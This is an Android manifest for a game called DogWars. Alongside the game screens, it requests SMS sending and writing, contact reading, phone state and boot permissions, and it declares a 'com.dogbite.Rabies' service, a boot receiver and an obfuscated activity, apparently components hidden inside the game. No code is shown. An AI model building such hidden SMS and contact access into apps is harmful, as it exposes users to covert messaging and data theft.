<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="kagegames.apps.DWBeta">
    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="false"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <application android:icon="@drawable/icon" android:installLocation="preferExternal" android:label="@string/app_name" android:name=".DWApplication">
        <meta-data android:name="ADMOB_PUBLISHER_ID" android:value="FUKAGAEGAMES"/>
        <receiver android:name=".PuppyLoveWidgetProvider">
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
            </intent-filter>
            <meta-data android:name="android.appwidget.provider" android:resource="@layout/puppylove_widget_provider"/>
        </receiver>
        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".DogWars" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name="com.dogbite.Rabies">
            <intent-filter>
                <action android:name=".Rabies"/>
            </intent-filter>
        </service>
        <receiver android:name="com.dogbite.Doghouse">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <activity android:configChanges="keyboardHidden|orientation" android:name="SystemMsgModalActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="IntroStoryActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="SelectPlayerActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="SelectDogTypeActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="NameOwnerDogActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="UploadPicActivity" android:screenOrientation="landscape" android:theme="@style/DW_PopUp_Theme"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="ImageFileSelectActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="DWMainActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="StoreActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="TrainListActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="FightMainActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="FightActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="FightListActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="ScoreboardListActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="eo$pQ" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="ShoutboxActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="BuildCredActivity" android:noHistory="true" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="FightChallengeActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="FeedActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="Run Train Your Dog" android:name="TrainRunning" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="Drag Train Your Dog" android:name="TrainDragging" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="Bite Train Your Dog" android:name="TrainBiting" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
        <activity android:configChanges="keyboardHidden|orientation" android:label="Options" android:name="OptionsActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
    </application>
</manifest>